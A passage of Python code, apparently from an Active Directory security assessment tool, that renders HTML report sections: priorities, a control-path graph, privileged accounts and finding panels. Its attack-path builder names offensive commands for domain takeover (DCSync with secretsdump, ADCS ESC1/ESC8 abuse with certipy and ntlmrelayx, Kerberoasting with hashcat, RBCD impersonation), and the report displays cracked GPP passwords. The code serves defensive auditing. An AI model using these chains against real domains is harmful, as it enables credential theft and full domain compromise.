            key=lambda f: (-prio_key(f), self._SEV_ORDER.get(f.severity, 9), -len(f.affected)))[:12]
        prio_items = ""
        for i, f in enumerate(ranked, 1):
            w = EXPOSURE_WEIGHTS.get(f.rule_id, 0)
            naff = len(f.affected)
            aff = f' · <span class="kc-mono">{naff} affected</span>' if naff else ""
            if w:   # a modelled path to Tier-0 — show its exploitability score
                bar_w, bar_col = w, RiskScorer.risk_label(w)[1]
                xlabel = f'exploitability {w}/100'
            else:   # high-severity, but not a modelled one-step Tier-0 primitive
                bar_w, bar_col = self._PSEUDO_WEIGHT.get(f.severity, 0), f.sev_color
                xlabel = f'{self._e(f.severity.title())} severity'
            prio_items += (
                f'<li><span class="kc-prio-rank">{i}</span>'
                '<div class="kc-prio-body">'
                f'<span class="kc-prio-title"><a href="#f-{self._e(f.rule_id)}" '
                f'onclick="kcJump(\'f-{self._e(f.rule_id)}\');return false">{self._e(f.title)}</a></span>'
                f'<span class="kc-prio-note">{self._e(self._attacker_note(f))}{aff}</span></div>'
                '<div class="kc-prio-meta"><div class="kc-prio-tags">'
                f'<span class="kc-sev-pill" style="background:{f.sev_color}">{self._e(f.severity)}</span>'
                f'{self._effort_badge(f.rule_id)}</div>'
                f'<div class="kc-xbar"><i style="width:{bar_w}%;background:{bar_col}"></i></div>'
                f'<span class="kc-xlabel">{xlabel}</span></div></li>')
        prio = (f'<ul class="kc-prio">{prio_items}</ul>' if prio_items
                else '<p class="kc-prio-empty">No critical or high-severity findings surfaced — '
                     'work the Quick Wins and the full Findings list.</p>')
        # Quick wins — low remediation effort, meaningful risk reduction first.
        def impact(f):
            return max(EXPOSURE_WEIGHTS.get(f.rule_id, 0), self._PSEUDO_WEIGHT.get(f.severity, 0))
        qw = sorted([f for f in uniq if rule_effort(f.rule_id) == "Low" and f.severity != "INFO"],
                    key=lambda f: -impact(f))[:8]
        qw_items = "".join(
            f'<li><span class="kc-qw-dot" style="background:{f.sev_color}"></span>'
            f'<span class="kc-qw-t"><a href="#f-{self._e(f.rule_id)}" '
            f'onclick="kcJump(\'f-{self._e(f.rule_id)}\');return false">{self._e(f.title)}</a></span>'
            f'<span class="kc-xlabel">{self._e(f.severity.title())}</span></li>' for f in qw)
        qw_html = (f'<ul class="kc-qw">{qw_items}</ul>' if qw_items
                   else '<p class="kc-prio-empty">No low-effort quick wins identified.</p>')
        return ('<section class="kc-section" id="sec-priorities">'
                '<h2 class="kc-h2">Priorities<span class="tag">what to fix first</span></h2>'
                '<div class="kc-prio-grid">'
                '<div><div class="kc-sub-h">Top priorities '
                '<span style="font-weight:400;text-transform:none;letter-spacing:0;color:var(--faint)">'
                '— ranked by exploitability, then severity (easiest path to Tier-0 first)</span></div>'
                f'{prio}</div>'
                '<div><div class="kc-sub-h">Quick wins '
                '<span style="font-weight:400;text-transform:none;letter-spacing:0;color:var(--faint)">'
                '— low remediation effort, high payoff</span></div>'
                f'{qw_html}</div>'
                '</div></section>')

    # ── Paths to Domain Dominance (control-path chains) ───────────────────────
    def _node(self, label, kind="", icon=""):
        cls = "kc-node" + (f" {kind}" if kind else "")
        ic = f'<span class="ic">{icon}</span>' if icon else ""
        return f'<span class="{cls}">{ic}{self._e(label)}</span>'

    # ── control-path node registry / clickable nodes / graph ──────────────────
    def _cp(self):
        return getattr(self.data, "control_paths", None) or {}

    def _cp_nodes(self):
        return self._cp().get("nodes") or {}

    def _pnode(self, name, kind=""):
        """A clickable control-path node — opens the detail drawer (PingCastle-
        style: group members, account enabled / pwd-age / stale, etc.)."""
        meta = self._cp_nodes().get(name, {})
        if not kind:
            kind = "crown" if meta.get("tier0") else ("loot" if meta.get("type") == "gpo" else "")
        cls = "kc-node clk" + (f" {kind}" if kind else "")
        stale = ' data-stale="1"' if meta.get("stale") else ''
        known = ' data-known="1"' if name in self._cp_nodes() else ''
        return (f'<span class="{cls}" role="button" tabindex="0" data-node="{self._e(name)}"{stale}{known} '
                f'onclick="kcNode(this)" onkeydown="if(event.key===\'Enter\'){{kcNode(this)}}">'
                f'{self._e(name)}</span>')

    def _node_registry_json(self):
        import json as _json
        nodes = self._cp_nodes()
        # ensure_ascii (json default) already escapes non-ASCII incl. U+2028/9.
        # Neutralize < and > so no AD object name (e.g. one containing
        # "</script>") can break out of the inline <script> element.
        return (_json.dumps(nodes, default=str)
                .replace("<", "\\u003c").replace(">", "\\u003e"))

    def _control_graph_svg(self):
        """Server-rendered layered graph of the control paths — the 'visual' an
        operator can click into. No JS layout dependency; nodes are clickable."""
        cp = self._cp(); edges = cp.get("edges") or []; meta = cp.get("nodes") or {}
        if not edges:
            return ""
        names = list(meta.keys())
        adj = defaultdict(set); radj = defaultdict(set)
        for e in edges:
            if e["src"] in meta and e["dst"] in meta:
                adj[e["src"]].add(e["dst"]); radj[e["dst"]].add(e["src"])
        # layer = longest distance from a source; relax with a cap to survive cycles
        layer = {n: 0 for n in names}
        for _ in range(len(names) + 1):
            changed = False
            for n in names:
                if radj[n]:
                    lv = 1 + max((layer[p] for p in radj[n]), default=0)
                    if lv > layer[n] and lv <= len(names):
                        layer[n] = lv; changed = True
            if not changed:
                break
        layers = defaultdict(list)
        for n in names:
            layers[layer[n]].append(n)
        for lv in layers:
            layers[lv].sort()
        maxlayer = max(layers) if layers else 0
        rowmax = max((len(v) for v in layers.values()), default=1)
        NW, NH, GX, GY, MX, MY = 168, 30, 66, 14, 14, 16
        width = MX * 2 + (maxlayer + 1) * NW + maxlayer * GX
        height = MY * 2 + rowmax * (NH + GY)
        pos = {}
        for lv, ns in layers.items():
            x = MX + lv * (NW + GX)
            total = len(ns) * (NH + GY) - GY
            y0 = MY + (height - 2 * MY - total) / 2
            for i, n in enumerate(ns):
                pos[n] = (x, y0 + i * (NH + GY))
        def col(n):
            m = meta.get(n, {})
            if m.get("tier0"): return ("rgba(189,66,52,.18)", "var(--crit)")
            t = m.get("type", "")
            if t == "group":   return ("var(--surface3)", "var(--accent2)")
            if t == "gpo":     return ("var(--surface3)", "var(--accent)")
            if t == "broad":   return ("rgba(203,122,47,.16)", "var(--high)")
            if m.get("stale"): return ("var(--surface3)", "var(--warn)")
            return ("var(--surface3)", "var(--border2)")
        seg = ['<defs><marker id="kcarr" markerWidth="9" markerHeight="9" refX="8" refY="3" '
               'orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="var(--accent)"/></marker></defs>']
        for e in edges:
            if e["src"] not in pos or e["dst"] not in pos:
                continue
            x1, y1 = pos[e["src"]]; x2, y2 = pos[e["dst"]]
            sx, sy = x1 + NW, y1 + NH / 2; ex, ey = x2, y2 + NH / 2
            mx, my = (sx + ex) / 2, (sy + ey) / 2
            seg.append(f'<line x1="{sx:.0f}" y1="{sy:.0f}" x2="{ex:.0f}" y2="{ey:.0f}" '
                       f'stroke="var(--border2)" stroke-width="1.3" marker-end="url(#kcarr)"/>')
            seg.append(f'<text x="{mx:.0f}" y="{my-3:.0f}" text-anchor="middle" font-size="9" '
                       f'fill="var(--muted)" font-family="var(--mono)">{self._e(e["label"])}</text>')
        for n, (x, y) in pos.items():
            fill, stroke = col(n)
            lbl = n if len(n) <= 22 else n[:21] + "…"
            seg.append(
                f'<g class="kc-gnode" role="button" tabindex="0" data-node="{self._e(n)}" '
                f'onclick="kcNode(this)" onkeydown="if(event.key===\'Enter\'){{kcNode(this)}}">'
                f'<rect x="{x:.0f}" y="{y:.0f}" width="{NW}" height="{NH}" rx="6" fill="{fill}" '
                f'stroke="{stroke}" stroke-width="1.4"/>'
                f'<text x="{x+NW/2:.0f}" y="{y+NH/2+4:.0f}" text-anchor="middle" font-size="11.5" '
                f'fill="var(--text)" font-family="var(--sans)">{self._e(lbl)}</text></g>')
        return (f'<div class="kc-graph-wrap"><svg width="{width:.0f}" height="{height:.0f}" '
                f'viewBox="0 0 {width:.0f} {height:.0f}" role="img" '
                f'aria-label="Control-path graph to Tier 0">{"".join(seg)}</svg></div>')

    def _edge(self, label):
        return f'<span class="kc-edge">{self._e(label)}</span>'

    def _chain(self, nodes_edges, sev, tool=""):
        """nodes_edges: list alternating node-html, edge-label, node-html, …"""
        row = ""
        for i, part in enumerate(nodes_edges):
            row += part if i % 2 == 0 else self._edge(part)
        meta = f'<div class="kc-chain-meta"><span class="kc-sev-pill" style="background:{SEV_COLOR.get(sev,"#888")}">{sev}</span>' \
               + (f'<span class="kc-chain-tool">{self._e(tool)}</span>' if tool else "") + '</div>'
        scls = {"CRITICAL":"", "HIGH":"sev-high", "MEDIUM":"sev-medium"}.get(sev, "sev-medium")
        return f'<div class="kc-chain {scls}"><div class="kc-chain-row">{row}</div>{meta}</div>'

    def _build_paths(self):
        """Synthesize attacker -> … -> Tier 0 chains from the findings + ACL data.
        Returns list of (severity, html, rule_id)."""
        chains = []
        # Node convention (no emoji — they rendered inconsistently and looked
        # unprofessional): "attacker" = a principal/host you control, "loot" = a
        # secret/certificate you capture, "crown" = Tier-0 / Domain Admin. Plain
        # nodes are ordinary AD objects on the route.
        DA = self._node("Domain Admin", "crown")
        DOM = self._node("Domain compromise", "crown")
        any_user = self._node("Any domain user", "attacker")
        unauth = self._node("Unauthenticated", "attacker")
        add = lambda sev, nodes, tool, rid: chains.append((sev, self._chain(nodes, sev, tool), rid))

        for a in self.data.acl_findings:
            t = a.get("type",""); who = a.get("sid_name") or a.get("sid") or "principal"
            right = a.get("right",""); obj = a.get("object","")
            n_who = self._node(who, "attacker")
            if t == "dcsync":
                add("CRITICAL", [n_who, "DCSync", self._node("NTDS secrets","loot"), "dump hashes", DOM], "secretsdump.py -just-dc", "P-DCSync")
            elif t in ("dangerous_acl","owner"):
                add("CRITICAL", [n_who, right or "WriteDACL", self._node(obj or "Domain root"), "grant DCSync", DOM], "dacledit / secretsdump", "P-DangerousACLDomain")
            elif t == "gpo_write":
                add("CRITICAL", [n_who, "edit GPO", self._node(obj or "GPO"), "applies to", self._node("Computers / DCs"), "SYSTEM", DOM], "pyGPOAbuse", "P-ModifiableGPO")
            elif t == "write_property":
                add("HIGH", [n_who, right or "Write", self._node(obj or "privileged object"), "add member", DA], "", "P-WriteToPrivGroup")

        def has(rid): return rid in self.by_rule
        def aff(rid, n=1):
            f = self.by_rule.get(rid)
            return (f.affected[:n] if f and f.affected else [])

        if has("P-DCSync") and not any(r == "P-DCSync" for _,_,r in chains):
            who = (aff("P-DCSync") or ["non-admin principal"])[0]
            add("CRITICAL", [self._node(who.split()[0],"attacker"), "DCSync", self._node("NTDS secrets","loot"), "dump hashes", DOM], "secretsdump.py -just-dc", "P-DCSync")
        if has("P-GPPPassword"):
            add("CRITICAL", [any_user, "read SYSVOL", self._node("GPP cpassword","loot"), "AES-decrypt", self._node("Local admin creds","loot")], "gpp-decrypt", "P-GPPPassword")
        if has("A-CertTempCustomSubject"):
            tmpl = (aff("A-CertTempCustomSubject") or ["vuln template"])[0]
            add("CRITICAL", [any_user, "ESC1 enroll", self._node(tmpl), "SAN = DA", self._node("DA certificate","loot"), "PKINIT", DA], "certipy req -upn administrator@…", "A-CertTempCustomSubject")
        if has("A-CertTemplateESC4"):
            tmpl = (aff("A-CertTemplateESC4") or ["template"])[0].split()[0]
            add("CRITICAL", [any_user, "ESC4 WriteDACL", self._node(tmpl), "make ESC1", self._node("DA certificate","loot"), "PKINIT", DA], "certipy template", "A-CertTemplateESC4")
        if has("A-CertEnrollHttp"):
            add("CRITICAL", [self._node("Coerced DC$","attacker"), "NTLM relay", self._node("ADCS web enrollment (ESC8)"), "issue", self._node("DC certificate","loot"), "DCSync", DOM], "PetitPotam + ntlmrelayx", "A-CertEnrollHttp")
        if has("P-ServiceDomainAdmin") or has("S-KerberoastableAdmin"):
            svc = (aff("S-KerberoastableAdmin") or aff("P-ServiceDomainAdmin") or ["svc_admin"])[0].split()[0]
            add("CRITICAL", [any_user, "Kerberoast", self._node(svc), "crack RC4", self._node("Service password","loot"), "member of", DA], "GetUserSPNs.py -request → hashcat -m 13100", "S-KerberoastableAdmin")
        if has("P-ComputerInPrivGroup"):
            m = (aff("P-ComputerInPrivGroup") or ["WS$"])[0].split()[0]
            add("CRITICAL", [self._node("SYSTEM on "+m,"attacker"), "machine secret", self._node(m), "member of", DA], "", "P-ComputerInPrivGroup")
        if has("S-SIDHistoryPrivileged"):
            who = (aff("S-SIDHistoryPrivileged") or ["account"])[0].split()[0]
            add("CRITICAL", [self._node(who,"attacker"), "SID history", self._node("Privileged SID","loot"), "honored at logon", DA], "", "S-SIDHistoryPrivileged")
        if has("P-RBCD-Dangerous"):
            # Name the principal that actually holds the delegation over the DC —
            # the finding evidence is "DC$ ← <principal(s)>" (issue #4).
            ev = (aff("P-RBCD-Dangerous") or [""])[0]
            who = ev.split("←", 1)[1].strip().split(",")[0].strip() if "←" in ev else ""
            who = who or "controlled principal"
            add("CRITICAL", [self._node(who,"attacker"), "RBCD S4U", self._node("Domain controller"), "impersonate any user", DA], "getST.py -spn cifs/dc -impersonate Administrator", "P-RBCD-Dangerous")
        elif has("P-RBCD"):
            tgt = (aff("P-RBCD") or ["host"])[0].split("←")[0].strip() or "host"
            add("HIGH", [self._node("controlled / new machine","attacker"), "RBCD S4U", self._node(tgt), "impersonate any user", self._node("Host compromise")], "rbcd.py + getST.py", "P-RBCD")
        if has("P-UnconstrainedDelegation"):
            h = (aff("P-UnconstrainedDelegation") or ["host"])[0]
            add("CRITICAL", [self._node("Coerced DC$","attacker"), "authenticates to", self._node(h+" (unconstrained)"), "capture TGT", DA], "printerbug.py + krbrelayx", "P-UnconstrainedDelegation")
        # MAQ is only a Tier-0 path when the target's RBCD attribute can actually
        # be written: via an existing controllable RBCD, or an NTLM relay to the
        # directory (LDAP signing / LDAPS channel binding NOT enforced). When the
        # DC enforces signing + channel binding and no write primitive exists, MAQ
        # alone is not exploitable (issue #4) — it remains a finding, not a path.
        relay_viable = (has("A-DCLdapSign") or has("A-LDAPSigningDisabled")
                        or has("A-DCLdapsChannelBinding"))
        if has("P-MachineAccountQuota") and has("P-RBCD"):
            add("HIGH", [any_user, "add machine (MAQ)", self._node("attacker computer"),
                         "configure RBCD on target", self._node("RBCD-enabled host"),
                         "S4U impersonate", self._node("Host compromise")],
                "addcomputer.py + rbcd.py + getST.py", "P-MachineAccountQuota")
        elif has("P-MachineAccountQuota") and relay_viable:
            add("HIGH", [any_user, "add machine (MAQ)", self._node("attacker computer"),
                         "coerce + relay to LDAP", self._node("write RBCD on target"),
                         "S4U impersonate", self._node("Host compromise")],
                "addcomputer.py + ntlmrelayx --delegate-access", "P-MachineAccountQuota")
        if has("A-DnsZoneAUCreateChild"):
            add("HIGH", [any_user, "ADIDNS write", self._node("wpad / * record"), "coerce + relay", self._node("Victim credentials","loot")], "dnstool.py + Responder", "A-DnsZoneAUCreateChild")
        if has("S-NoPreAuthAdmin") or has("S-NoPreAuth"):
            who = (aff("S-NoPreAuthAdmin") or aff("S-NoPreAuth") or ["account"])[0].split()[0]
            admin = has("S-NoPreAuthAdmin")
            sev = "CRITICAL" if admin else "HIGH"
            nodes = [unauth, "AS-REP roast", self._node(who), "crack hash", self._node("Cracked password","loot")]
            if admin:
                nodes += ["member of", DA]
            add(sev, nodes, "GetNPUsers.py → hashcat -m 18200",
                "S-NoPreAuthAdmin" if admin else "S-NoPreAuth")
        if has("A-Pre2kComputer"):
            m = (aff("A-Pre2kComputer") or ["HOST$"])[0].split()[0]
            add("HIGH", [unauth, "guess default password", self._node(m), "authenticate as "+m, self._node("Domain foothold")], "pre2k auth / getTGT.py", "A-Pre2kComputer")
        if has("A-WeakLockout"):
            add("HIGH", [unauth, "password spray", self._node("No lockout policy"), "valid credentials", self._node("Domain foothold")], "nxc smb --continue-on-success / kerbrute", "A-WeakLockout")
        if has("A-SCCM"):
            h = (aff("A-SCCM") or ["SCCM site server"])[0].split()[0]
            add("HIGH", [self._node("Coerced / relayed auth","attacker"), "NTLM relay", self._node(h+" (MP / site)"), "NAA / site DB", self._node("Privileged credentials","loot")], "SharpSCCM / sccmhunter / ntlmrelayx", "A-SCCM")
        return chains

    def _inline_path(self, rule_id):
        """The attack-path chain HTML for a given rule, for inline use in panels."""
        if getattr(self, "_paths_cache", None) is None:
            self._paths_cache = self._build_paths()
        for _, html, rid in self._paths_cache:
            if rid == rule_id:
                return html
        return ""

    def _paths_section(self):
        chains = self._build_paths()
        if not chains:
            return ('<section class="kc-section" id="sec-paths"><h2 class="kc-h2">Attack paths</h2>'
                    '<p class="kc-sub">No short path to Tier 0 surfaced from the collected data.</p></section>')
        order = {"CRITICAL":0,"HIGH":1,"MEDIUM":2}
        chains.sort(key=lambda c: order.get(c[0], 3))
        ncrit = sum(1 for s,_,_ in chains if s == "CRITICAL")
        body = "".join(h for _, h, _ in chains)
        # exposure stats
        dc_n = len(self.data.dcs)
        unconstrained = len(self.by_rule.get("P-UnconstrainedDelegation").affected) if "P-UnconstrainedDelegation" in self.by_rule else 0
        ca_n = len(self.data.enrollment_svcs) if getattr(self.data, "enrollment_svcs", None) else 0
        stats = (f'<div class="kc-paths-tag">'
                 f'<div class="kc-pstat"><b>{len(chains)}</b><span>escalation paths</span></div>'
                 f'<div class="kc-pstat"><b>{ncrit}</b><span>one-step to Tier 0</span></div>'
                 f'<div class="kc-pstat"><b>{dc_n}</b><span>domain controllers</span></div>'
                 f'<div class="kc-pstat"><b>{ca_n}</b><span>certificate authorities</span></div>'
                 f'<div class="kc-pstat"><b>{unconstrained}</b><span>unconstrained hosts</span></div>'
                 f'</div>')
        return ('<section class="kc-section kc-critborder" id="sec-paths">'
                '<h2 class="kc-h2">Attack paths<span class="tag">low-priv → Tier 0</span></h2>'
                '<p class="kc-sub">Routes to domain compromise, with the tradecraft to walk each.</p>'
                f'{stats}{body}</section>')

    # ── action plan ────────────────────────────────────────────────────────────
    _PRIV_ORDER = ["Domain Admins","Enterprise Admins","Schema Admins","Administrators",
                   "Account Operators","Backup Operators","Server Operators","Print Operators",
                   "Group Policy Creator Owners","DnsAdmins","Key Admins","Enterprise Key Admins",
                   "Cert Publishers","Exchange Windows Permissions"]

    def _acct_flags(self, m):
        """Return (flags, notable) for a privileged member account."""
        a = m["attrs"]; uac = get_int(a, "userAccountControl")
        sam = get_str(a, "sAMAccountName")
        flags = []; notable = False
        disabled = uac_has(uac, UAC_ACCOUNTDISABLE)
        machine = sam.endswith("$") or uac_has(uac, UAC_WORKSTATION_TRUST) or uac_has(uac, UAC_SERVER_TRUST)
        if disabled:
            flags.append(('<span class="kc-aflag dis">disabled</span>', "dis"))
        if machine and not disabled:
            flags.append(('<span class="kc-aflag bad">machine acct</span>', "bad")); notable = True
        spn = get_list(a, "servicePrincipalName")
        if spn and not disabled and not machine:
            flags.append(('<span class="kc-aflag bad">kerberoastable</span>', "bad")); notable = True
        if uac_has(uac, UAC_DONT_EXPIRE_PASSWORD) and not disabled:
            flags.append(('<span class="kc-aflag warn">pwd never expires</span>', "warn")); notable = True
        if uac_has(uac, UAC_DONT_REQUIRE_PREAUTH) and not disabled:
            flags.append(('<span class="kc-aflag bad">AS-REP roastable</span>', "bad")); notable = True
        ll_age = days_since(filetime_to_dt(get_int(a, "lastLogonTimestamp")))
        if not disabled and ll_age is not None and ll_age > 90:
            flags.append((f'<span class="kc-aflag warn">stale {ll_age}d</span>', "warn")); notable = True
        if not disabled and ll_age is None:
            flags.append(('<span class="kc-aflag warn">never logged on</span>', "warn")); notable = True
        return flags, notable, disabled

    def _priv_member_row(self, m):
        a = m["attrs"]; sam = get_str(a, "sAMAccountName") or dn_base(m["dn"])
        uac = get_int(a, "userAccountControl")
        disabled = uac_has(uac, UAC_ACCOUNTDISABLE)
        pw_age = days_since(filetime_to_dt(get_int(a, "pwdLastSet")))
        ll_age = days_since(filetime_to_dt(get_int(a, "lastLogonTimestamp")))
        admin = "yes" if get_int(a, "adminCount") == 1 else "—"
        flags, notable, _ = self._acct_flags(m)
        st = '<span class="kc-bad">disabled</span>' if disabled else '<span class="kc-ok">enabled</span>'
        fhtml = " ".join(fl for fl, _ in flags) or '<span class="kc-aflag ok">clean</span>'
        cls = ' class="kc-notable"' if notable else ''
        return (f'<tr{cls}><td><strong>{self._e(sam)}</strong></td><td>{st}</td>'
                f'<td class="kc-num">{admin}</td>'
                f'<td class="kc-num">{pw_age if pw_age is not None else "—"}</td>'
                f'<td class="kc-num">{ll_age if ll_age is not None else "—"}</td>'
                f'<td>{fhtml}</td></tr>')

    def _privileged_section(self):
        pgm = self.data.priv_group_members
        groups = [g for g in self._PRIV_ORDER if pgm.get(g)]
        groups += [g for g in pgm if g not in self._PRIV_ORDER and pgm.get(g)]
        blocks = ""
        gi = 0
        for g in groups:
            members = pgm[g]
            # de-dup by dn
            seen = set(); uniq = []
            for m in members:
                if m["dn"] in seen: continue
                seen.add(m["dn"]); uniq.append(m)
            notable_n = sum(1 for m in uniq if self._acct_flags(m)[1])
            rows = "".join(self._priv_member_row(m) for m in
                           sorted(uniq, key=lambda m: (0 if self._acct_flags(m)[1] else 1,
                                                       get_str(m["attrs"],"sAMAccountName").lower()))[:80])
            gid = f"pg-{gi}"; gi += 1
            warn = f' · <span class="kc-bad">{notable_n} notable</span>' if notable_n else ""
            blocks += (
                f'<div class="kc-pg"><div class="kc-pg-h" onclick="kcRowTog(\'{gid}\')">'
                f'<span class="kc-pg-ar" id="ar-{gid}">▸</span> <strong>{self._e(g)}</strong>'
                f'<span class="kc-pg-n">{len(uniq)} member(s){warn}</span></div>'
                f'<div class="kc-pg-b" id="{gid}" style="display:none">'
                '<table class="kc-table"><thead><tr><th>Account</th><th>Status</th>'
                '<th class="kc-num">Admin</th><th class="kc-num">Pwd age (d)</th>'
                '<th class="kc-num">Last logon (d)</th><th>Flags</th></tr></thead>'
                f'<tbody>{rows}</tbody></table></div></div>')
        # control-path closure: shortest paths to Domain Admin (PingCastle /
        # BloodHound-style). Nodes are clickable — click one to open the drawer
        # with its members / account facts; the graph gives the visual overview.
        cpaths = self._cp()
        cp = ""
        if cpaths.get("paths"):
            chains = ""
            for name, path, is_broad in cpaths["paths"]:
                if not path:
                    continue
                ne = [self._pnode(path[0][0], "attacker")]
                for k, (src, label, dst) in enumerate(path):
                    last = (k == len(path) - 1)
                    ne += [label, self._pnode(dst, "crown" if last else "")]
                chains += self._chain(ne, "CRITICAL" if is_broad else "HIGH",
                                      "membership + ACL / ownership")
            extra = cpaths.get("count", 0) - len(cpaths["paths"])
            more = f'<p class="kc-sub">… and {extra} more principal(s) with a path to Tier-0.</p>' if extra > 0 else ""
            graph = self._control_graph_svg()
            graph_hdr = ('<div class="kc-sub-h">Control-path graph '
                         '<span style="font-weight:400;text-transform:none;letter-spacing:0;color:var(--faint)">'
                         '— click any node for members / account detail</span></div>') if graph else ""
            cp = (graph_hdr + graph +
                  '<div class="kc-sub-h">Shortest paths to Domain Admin '
                  f'<span style="font-weight:400;text-transform:none;letter-spacing:0;color:var(--faint)">'
                  f'— {cpaths.get("count",0)} non-privileged principal(s) can reach Tier-0; click a node</span></div>'
                  f'{chains}{more}')
        if not blocks and not cp:
            return ""
        return ('<section class="kc-section" id="sec-priv"><h2 class="kc-h2">Privileged accounts'
                '<span class="tag">click a group — notable = stale / kerberoastable / no-expiry</span></h2>'
                f'{blocks}{cp}</section>')

    # ── findings register ──────────────────────────────────────────────────────
    def _gpp_table(self):
        pw = self.data.sysvol_data.get("gpp_passwords", [])
        if not pw:
            return ""
        rows = ""
        for p in pw:
            fn = p.get("file",""); base = fn.split("\\")[-1] if "\\" in fn else fn
            rows += (f'<tr><td><strong>{self._e(p.get("username",""))}</strong></td>'
                     f'<td><code class="kc-crit-val">{self._e(p.get("plaintext",""))}</code></td>'
                     f'<td>{self._e(p.get("gpo_name",""))}</td><td><code>{self._e(base)}</code></td></tr>')
        return ('<table class="kc-table"><thead><tr><th>Username</th><th>Cracked password</th>'
                f'<th>GPO</th><th>File</th></tr></thead><tbody>{rows}</tbody></table>')

    # ── rich affected-object tables (Insight-Recon style) ─────────────────────
    def _resolve_affected(self, f, limit=400):
        """Split a finding's affected strings into (resolved objects, leftover
        strings) by matching the leading token against the sAMAccountName index."""
        resolved = []; unresolved = []
        for a in f.affected[:limit]:
            s = str(a).strip()
            token = s.split()[0] if s else ""
            obj = self._obj_index.get(token.rstrip(",:;").lower())
            if obj:
                resolved.append(obj)
            else:
                unresolved.append(s)
        return resolved, unresolved

    def _fmt_created(self, attrs):
        v = get_str(attrs, "whenCreated")
        if not v:
            return "—"
        if len(v) >= 10 and v[4] == "-" and v[7] == "-":   # ldap3 datetime str
            return v[:10]
        if len(v) >= 8 and v[:8].isdigit():                 # impacket generalized time
            return f"{v[0:4]}-{v[4:6]}-{v[6:8]}"
        return v[:10]

    def _aff_flags(self, a):
        uac = get_int(a, "userAccountControl"); fl = []
        if uac_has(uac, UAC_DONT_REQUIRE_PREAUTH): fl.append("AS-REP roastable")
        if get_list(a, "servicePrincipalName") and not (get_str(a,"sAMAccountName") or "").endswith("$"):
            fl.append("kerberoastable")
        if uac_has(uac, UAC_DONT_EXPIRE_PASSWORD): fl.append("pwd never expires")
        if uac_has(uac, UAC_TRUSTED_FOR_DELEGATION): fl.append("unconstrained")
        if uac_has(uac, UAC_PASSWD_NOTREQD): fl.append("no pwd required")
        if get_int(a, "adminCount") == 1: fl.append("adminCount=1")
        return ", ".join(fl) or "—"

    def _affected_table(self, f, resolved, unresolved):
        shown = resolved[:60]; rows = ""
        for o in shown:
            a = o["attrs"]
            sam = get_str(a, "sAMAccountName")
            name = get_str(a, "displayName") or get_str(a, "name") or ""
            disabled = uac_has(get_int(a, "userAccountControl"), UAC_ACCOUNTDISABLE)
            en = ('<span class="kc-bad">no</span>' if disabled
                  else '<span class="kc-ok">yes</span>')
            pw = days_since(filetime_to_dt(get_int(a, "pwdLastSet")))
            ll = days_since(filetime_to_dt(get_int(a, "lastLogonTimestamp")))
            rows += (f'<tr><td><strong>{self._e(sam)}</strong></td><td>{self._e(name)}</td>'
                     f'<td>{en}</td><td class="kc-mono">{self._e(self._fmt_created(a))}</td>'
                     f'<td class="kc-num">{pw if pw is not None else "—"}</td>'
                     f'<td class="kc-num">{ll if ll is not None else "—"}</td>'
                     f'<td class="kc-detail">{self._e(self._aff_flags(a))}</td></tr>')
        total = len(f.affected); more = ""
        if total > len(shown):
            more += (f'<div class="kc-aff-more">Showing first {len(shown)} of {total} affected — '
                     'full set via <code>--csv</code> / <code>--json</code>.</div>')
        if unresolved:
            u = ", ".join(self._e(x.split()[0]) for x in unresolved[:10])
            more += (f'<div class="kc-aff-more">Also affected: {u}'
                     f'{" …" if len(unresolved) > 10 else ""}.</div>')
        fn = "scout-" + f.rule_id.lower()
        return ('<div class="kc-aff-tbl"><table class="kc-table"><thead><tr>'
                '<th>Account</th><th>Name</th><th>Enabled</th><th>Created</th>'
                '<th class="kc-num">Pwd set (d)</th><th class="kc-num">Last logon (d)</th>'
                '<th>Flags</th></tr></thead>'
                f'<tbody>{rows}</tbody></table>'
                f'<div class="kc-aff-tools"><button class="kc-csvbtn" data-fn="{self._e(fn)}" '
                'onclick="kcCsv(this)">Export CSV ⤓</button></div>'
                f'{more}</div>')

    def _frameworks_block(self, f):
        comp = rule_compliance(f.rule_id, self._opcat(f))
        groups = []
        if f.mitre:
            chips = "".join(f'<span class="kc-fwchip attck" title="{self._e(m)}">'
                            f'{self._e(m.split(":")[0])}</span>' for m in f.mitre)
            groups.append(f'<div class="kc-fwgrp"><span class="kc-fwlbl">ATT&amp;CK</span>{chips}</div>')
        if comp["mitigation"]:
            chips = "".join(f'<span class="kc-fwchip" title="{self._e(MITIGATION_NAME.get(m, m))}">'
                            f'{self._e(m)}</span>' for m in comp["mitigation"])
            groups.append(f'<div class="kc-fwgrp"><span class="kc-fwlbl">Mitigations</span>{chips}</div>')
        if comp["cis"]:
            chips = "".join(f'<span class="kc-fwchip">{self._e(c)}</span>' for c in comp["cis"])
            groups.append(f'<div class="kc-fwgrp"><span class="kc-fwlbl">CIS v8</span>{chips}</div>')
        if comp["nist"]:
            chips = "".join(f'<span class="kc-fwchip">{self._e(c)}</span>' for c in comp["nist"])
            groups.append(f'<div class="kc-fwgrp"><span class="kc-fwlbl">NIST CSF</span>{chips}</div>')
        if not groups:
            return ""
        return ('<div class="kc-block"><div class="kc-bh">Frameworks</div>'
                f'<div class="kc-fw">{"".join(groups)}</div></div>')

    def _finding_panel(self, f):
        doc = self._doc(f.rule_id); desc = doc.get("description") or ""
        parts = []
        # 1) inline attack-path visual (if this finding is an escalation path)
        path = self._inline_path(f.rule_id)
        if path:
            parts.append(f'<div class="kc-block"><div class="kc-bh">Attack path</div>{path}</div>')
        # 2) evidence — what SCOUT observed. Resolve affected objects into a rich
        # account/computer table (enabled / created / pwd-set / last-logon / flags)
        # when possible; otherwise fall back to the terminal-style list.
        det = f'<span class="t-ok">[+]</span> {self._e(f.details)}' if f.details else ""
        rich = ""; flat = ""
        if f.rule_id == "P-GPPPassword":
            rich = self._gpp_table()
        elif f.affected:
            resolved, unresolved = self._resolve_affected(f)
            if resolved and len(resolved) >= len(unresolved):
                rich = self._affected_table(f, resolved, unresolved)
            else:
                n = len(f.affected); shown = f.affected[:120]
                flat = "\n".join(f'    {self._e(a)}' for a in shown)
                if n > len(shown):
                    flat += f'\n    … and {n-len(shown)} more'
        if det or rich or flat:
            hdr = 'Evidence' + (f' — {len(f.affected)} affected' if f.affected else '')
            term_block = ""
            if det or flat:
                content = det + ("\n" if det and flat else "") + flat
                term_block = f'<pre class="kc-term">{content}</pre>'
            parts.append(f'<div class="kc-block"><div class="kc-bh">{hdr}</div>{term_block}{rich}</div>')
        # 3) narrative
        if desc:
            parts.append(f'<div class="kc-block"><div class="kc-bh">What it is</div><div class="kc-bb">{self._e(desc)}</div></div>')
        if doc.get("why"):
